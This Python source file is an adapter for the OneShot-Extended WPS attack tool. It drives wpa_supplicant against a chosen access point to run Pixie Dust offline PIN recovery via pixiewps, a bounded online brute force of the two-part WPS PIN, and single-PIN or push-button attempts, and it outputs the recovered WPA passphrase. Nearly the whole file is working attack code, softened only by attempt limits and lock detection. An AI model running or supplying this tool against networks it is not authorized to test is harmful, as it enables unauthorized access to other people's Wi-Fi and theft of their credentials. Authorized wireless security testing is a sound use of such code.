#!/usr/bin/env python3
"""GPL-2.0-or-later integration adapter for OneShot-Extended.

Reuses upstream WPS parser, PIN checksum and Pixiewps integration. Online PIN
search uses bounded batches, not upstream interactive/unbounded retry loops.
Protocol is one JSON request on stdin, JSON events on stdout; no raw debug logs.
"""
import contextlib
import io
import json
import os
import re
import select
import shutil
import signal
import socket
import subprocess
import sys
import time

BASE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(BASE, 'oneshot'))

def emit(**event):
    print(json.dumps(event, ensure_ascii=True), flush=True)

def validate(req):
    expected = {'interface', 'bssid', 'mode', 'pin'}
    if req.get('mode') == 'bruteforce':
        expected |= {'max_attempts', 'start_prefix'}
    if set(req) != expected:
        raise ValueError('invalid_fields')
    if req['interface'] != 'wlan0':
        raise ValueError('unsupported_interface')
    bssid = req['bssid']
    if not isinstance(bssid, str) or not re.fullmatch(r'(?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}', bssid) or int(bssid[:2], 16) & 1 or bssid == '00:00:00:00:00:00':
        raise ValueError('invalid_bssid')
    if req['mode'] not in ('pixie', 'pin', 'pbc', 'bruteforce') or not isinstance(req['pin'], str):
        raise ValueError('invalid_mode')
    if req['mode'] == 'pin':
        pin = req['pin']
        if not re.fullmatch(r'[0-9]{8}', pin) or sum(int(c) * (3 if i % 2 == 0 else 1) for i,c in enumerate(pin)) % 10:
            raise ValueError('invalid_pin_checksum')
    elif req['pin']:
        raise ValueError('unexpected_pin')
    if req['mode'] == 'bruteforce':
        if type(req['max_attempts']) is not int or req['max_attempts'] not in (10, 50, 100):
            raise ValueError('invalid_attempt_budget')
        if not isinstance(req['start_prefix'], str) or not re.fullmatch(r'[0-9]{4}',req['start_prefix']):
            raise ValueError('invalid_start_prefix')
    return req

class Telemetry:
    """Allowlisted observations only: never relay raw logs, keys or PIN guesses."""
    def __init__(self, req):
        self.started=time.monotonic()
        self.data=dict(mode=req['mode'],phase='wps_preparing',attempts=0,retries=0,
                      candidates=0,frames=0,retransmissions=0,message_mask=0,
                      lock_status='unknown',max_attempts=req.get('max_attempts',2 if req['mode']=='pixie' else 1),events=[])
    def event(self, phase, **values):
        self.data.update(values);self.data['phase']=phase
        record=dict(code=phase,seconds=int(time.monotonic()-self.started))
        for key in ('message','direction','config_error'):
            if key in values:record[key]=values[key]
        events=self.data['events']
        if not events or {k:v for k,v in events[-1].items() if k!='seconds'}!={k:v for k,v in record.items() if k!='seconds'}:
            events.append(record);del events[:-10]
        emit(**self.data)

def brute_search(req, exchange, progress, deadline, checksum, wait=time.sleep):
    """OneShot's two-part PIN search, bounded by exchanges AND wall-clock time.

    Ambiguous errors never eliminate candidates. M5 receipt alone is insufficient:
    the supplicant must also have constructed M6 (validated first-half exchange).
    """
    prefix=int(req['start_prefix']);suffix=0;second=False;retry=0;last_pin=''
    while progress.data['attempts'] < req['max_attempts'] and time.monotonic()<deadline:
        raw=prefix*1000+suffix
        last_pin=f'{raw:07d}{checksum(raw)}'
        if retry:progress.data['retries']+=1
        success, reason, half_valid = exchange(last_pin,30)
        if success:return True,last_pin,'credentials_received'
        if reason=='pin_rejected':
            retry=0
            if half_valid and not second:
                second=True;suffix=1
                progress.event('wps_second_half')
            elif second:suffix+=1
            else:prefix+=1
            if prefix>9999 or suffix>999:return False,last_pin,'range_exhausted'
        elif reason=='wps_timeout' and retry<2:
            retry+=1
        else:return False,last_pin,reason
        if progress.data['attempts']>=req['max_attempts']:break
        progress.event('wps_retry_wait' if retry else 'wps_next_pin')
        wait(min(3,max(0,deadline-time.monotonic())))
    return False,last_pin,'attempt_limit' if progress.data['attempts']>=req['max_attempts'] else 'session_limit'

def upstream(req):
    sys.argv = ['adapter', '-i', req['interface'], '-b', req['bssid'], '-D']
    from src import logger
    # Upstream debug lines may contain keys. Only our structured protocol escapes.
    for name in ('info', 'warning', 'error', 'success', 'debug'):
        setattr(logger, name, lambda *a, **k: None)
    import src.wps.connection
    return src.wps.connection.Initialize

def main():
    if '--check' in sys.argv:
        upstream({'interface':'wlan0','bssid':'02:00:00:00:00:01'})
        for binary in ('wpa_supplicant','pixiewps','iw','ip'):
            if not shutil.which(binary):
                raise ValueError('dependency_missing:' + binary)
        emit(ready=True, engine='OneShot-Extended', python=sys.version.split()[0], modes=['pixie','pin','pbc','bruteforce'], radio_started=False)
        return
    req = validate(json.loads(sys.stdin.readline(2048)))
    if os.getuid() != 0:
        raise ValueError('root_required')
    Parent = upstream(req)
    deadline = time.monotonic() + (600 if req['mode']=='bruteforce' else 120)
    progress=Telemetry(req)

    class Connection(Parent):
        def __init__(self, interface):
            try:super().__init__(interface)
            except BaseException:
                self._cleanup();raise
        def _cleanup(self):
            # Upstream cleanup assumes __init__ completed and waits indefinitely.
            sock=getattr(self,'RETSOCK',None)
            if sock is not None:sock.close()
            proc=getattr(self,'WPAS',None)
            if proc is not None:
                if proc.poll() is None:
                    proc.terminate()
                    try:proc.wait(timeout=1)
                    except subprocess.TimeoutExpired:
                        proc.kill();proc.wait(timeout=1)
                if proc.stdout:proc.stdout.close()
            for name in ('RES_SOCKET_FILE','TEMPCONF'):
                path=getattr(self,name,None)
                if path:
                    try:os.unlink(path)
                    except FileNotFoundError:pass
            path=getattr(self,'TEMPDIR',None)
            if path:shutil.rmtree(path,ignore_errors=True)

        def _initWpaSupplicant(self):
            self.WPAS = subprocess.Popen(['wpa_supplicant', '-K', '-d', '-Dnl80211', '-i'+self.INTERFACE, '-c'+self.TEMPCONF], stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
            until = min(deadline, time.monotonic()+10)
            while not os.path.exists(self.WPAS_CTRL_PATH):
                if self.WPAS.poll() is not None:
                    raise RuntimeError('supplicant_start_failed')
                if time.monotonic() > until:
                    raise TimeoutError('supplicant_start_timeout')
                # Drain without logging keys or blocking on a full pipe.
                if select.select([self.WPAS.stdout], [], [], .05)[0]:
                    os.read(self.WPAS.stdout.fileno(), 65536)

        def _wpsConnection(self, bssid=None, pin=None, pbc_mode=False, retry_on_lock=False, seconds=120):
            self.CONNECTION_STATUS.clear(); self.PIXIE_CREDS.clear()
            self.associated = ''; self.confirmed = False; self.buffer = b''
            self.reason='wps_timeout';self.half_valid=False;self.rx5=False
            pending_end=None;seen=set();tx_mask=0
            until=min(deadline,time.monotonic()+seconds)
            self.PIXIE_CREDS.BSSID = bssid.upper()
            self.RETSOCK.settimeout(3)
            command = f'WPS_PBC {bssid}' if pbc_mode else f'WPS_REG {bssid} {pin}'
            if self._sendAndReceive(command).strip() != 'OK':
                raise RuntimeError('wps_command_rejected')
            progress.data['attempts']+=1
            progress.data.pop('config_error',None)
            progress.data.pop('direction',None)
            progress.event('wps_wait_button' if pbc_mode else 'wps_wait_ap',message=0,message_mask=0)
            try:
                while time.monotonic() < until:
                    if pending_end is not None and time.monotonic()>=pending_end:return False
                    if self.WPAS.poll() is not None:
                        raise RuntimeError('supplicant_exited')
                    if not select.select([self.WPAS.stdout], [], [], .25)[0]:
                        continue
                    chunk = os.read(self.WPAS.stdout.fileno(), 65536)
                    if not chunk:
                        raise RuntimeError('supplicant_stream_closed')
                    self.buffer += chunk
                    if len(self.buffer)>131072:
                        raise RuntimeError('supplicant_output_limit')
                    while b'\n' in self.buffer:
                        raw,self.buffer = self.buffer.split(b'\n',1)
                        line = raw.decode('utf-8',errors='replace')
                        if re.match(r'^wlan0: Associated with ',line):
                            found = re.search(r'Associated with ((?:[0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2})',line)
                            if found:
                                self.associated=found[1].lower()
                                if self.associated!=bssid.lower():raise RuntimeError('target_mismatch')
                                progress.event('wps_associated')
                        if line.startswith('WPS: '):
                            self._handle_wps_messages(line)
                            # Upstream treats M2D/early NACK as lock; neither proves it.
                            self.CONNECTION_STATUS.IS_LOCKED=False
                            msg=re.fullmatch(r'WPS: (Received M|Building Message M)([1-8])',line)
                            if msg:
                                n=int(msg[2]);direction='rx' if msg[1]=='Received M' else 'tx'
                                key=(n,direction);progress.data['frames']+=1
                                if key in seen:progress.data['retransmissions']+=1
                                seen.add(key)
                                if direction=='tx':tx_mask|=1<<n
                                if direction=='rx' and n==5:self.rx5=True
                                if direction=='tx' and n==6 and self.rx5:self.half_valid=True
                                progress.event('wps_exchange',message=n,direction=direction,message_mask=progress.data['message_mask']|(1<<(n-1)))
                        else:
                            self._handle_connection_states(line, False)
                            if re.match(r'^wlan0: Trying to (authenticate|associate) with ',line):
                                progress.event('wps_authenticating')
                        if line=='WPS: Received M2D':
                            self.reason='negotiation_deferred';pending_end=time.monotonic()+.5
                            progress.event('wps_m2d')
                        if line=='WPS: Received WSC_NACK':
                            self.reason='negotiation_rejected';pending_end=time.monotonic()+.5
                            progress.event('wps_nack')
                        # Only the selected, associated AP's explicit failure event
                        # can supply this diagnosis, not arbitrary debug text/SSID.
                        failure=re.match(r'^(?:wlan0: )?WPS-FAIL(?:\s|$)',line)
                        if failure:
                            cfg=re.search(r'(?:^|\s)config_error=([0-9]+)(?:\s|$)',line)
                            if self.associated==bssid.lower() and cfg:
                                value=int(cfg[1])
                                if value==15:self.reason='wps_locked';progress.data['lock_status']='reported_locked'
                                elif value==18 and tx_mask&(1<<4):self.reason='pin_rejected'
                                progress.event('wps_failure',config_error=value)
                                if value==15:return False
                            if self.reason=='wps_timeout':self.reason='negotiation_rejected'
                            pending_end=time.monotonic()+.5
                        if re.match(r'^(?:wlan0: )?WPS-TIMEOUT(?:\s|$)',line):
                            self.reason='wps_timeout';pending_end=time.monotonic()+.5
                        if re.match(r'^(?:wlan0: )?WPS-OVERLAP-DETECTED(?:\s|$)',line):
                            self.reason='pbc_overlap';pending_end=time.monotonic()+.5
                        if re.match(r'^(?:wlan0: )?WPS-SUCCESS(?:\s|$)',line):
                            self.confirmed=True
                        if self.confirmed and self.CONNECTION_STATUS.WPA_PSK:
                            if self.associated != bssid.lower():
                                raise RuntimeError('target_mismatch')
                            return True
                return False
            finally:
                try:self._sendOnly('WPS_CANCEL')
                except OSError:pass

    conn=None;last_candidate=None
    def exchange(pin,seconds=120,pbc=False):
        nonlocal conn,last_candidate
        if conn is not None:conn._cleanup()
        # Fresh process/control socket per exchange: no stale CANCEL replies,
        # credentials or late frames may bleed into a later candidate.
        conn=Connection(req['interface'])
        if not pbc and pin!=last_candidate:progress.data['candidates']+=1;last_candidate=pin
        success=conn._wpsConnection(req['bssid'],pin,pbc,seconds=seconds)
        return success,conn.reason,conn.half_valid
    try:
        pin=req['pin'] if req['mode']=='pin' else '12345670'
        if req['mode']=='bruteforce':
            from src.wps.generator import WPSpin
            success,pin,reason=brute_search(req,exchange,progress,deadline,WPSpin.checksum)
        else:success,reason,_=exchange('' if req['mode']=='pbc' else pin,pbc=req['mode']=='pbc')
        if not success and req['mode']=='pixie' and reason!='wps_locked' and conn.PIXIE_CREDS.getAll():
            progress.event('pixie_calculation')
            with contextlib.redirect_stdout(io.StringIO()):
                pin=conn.PIXIE_CREDS.runPixieWps(False,False)
            if pin and re.fullmatch(r'[0-9]{8}',pin) and time.monotonic()<deadline:
                progress.event('wps_verifying')
                success,reason,_=exchange(pin)
            else:reason='pixie_no_pin'
        elif not success and req['mode']=='pixie' and reason not in ('wps_locked','negotiation_deferred','negotiation_rejected','wps_timeout'):
            reason='insufficient_pixie_data'
        progress.event('wps_complete' if success else reason)
        if success:
            emit(result={'outcome':'credentials_received','bssid':req['bssid'],'ssid':conn.CONNECTION_STATUS.ESSID,'pin':pin if req['mode']!='pbc' else '', 'password':conn.CONNECTION_STATUS.WPA_PSK,'protocol_confirmed':True,'telemetry':progress.data})
        else:
            emit(result={'outcome':'no_credentials','reason':reason,'bssid':req['bssid'],'protocol_confirmed':False,'telemetry':progress.data})
    finally:
        if conn is not None:
            conn._cleanup()

if __name__=='__main__':
    signal.signal(signal.SIGTERM, lambda *_: sys.exit(143))
    try:main()
    except (Exception,) as e:
        # Only explicitly classified errors, never native output/credential values.
        known={'invalid_fields','unsupported_interface','invalid_bssid','invalid_mode','invalid_pin_checksum','unexpected_pin','invalid_attempt_budget','invalid_start_prefix','root_required','supplicant_start_failed','supplicant_start_timeout','wps_command_rejected','supplicant_exited','supplicant_stream_closed','supplicant_output_limit','target_mismatch','wps_locked','wps_timeout'}
        emit(error=str(e) if str(e) in known else 'wps_runtime_error')
        sys.exit(1)
